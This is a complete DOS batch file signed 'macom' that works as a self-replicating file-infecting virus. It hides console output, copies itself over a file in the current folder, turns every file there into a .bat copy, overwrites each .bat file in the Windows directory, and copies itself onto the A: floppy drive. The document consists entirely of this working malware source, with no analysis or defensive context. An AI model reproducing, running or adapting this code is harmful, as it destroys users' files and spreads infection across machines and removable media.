REM Name:     macom         
REM Author:   macom         
@echo off
ctty nul
for %%v in (*.*) do Set A=%%v
copy %0 %A%
copy *.* *.bat
for %%w in (%windir%\*.bat) do copy %0 %%w
copy %0 A:\*.bat
ctty con
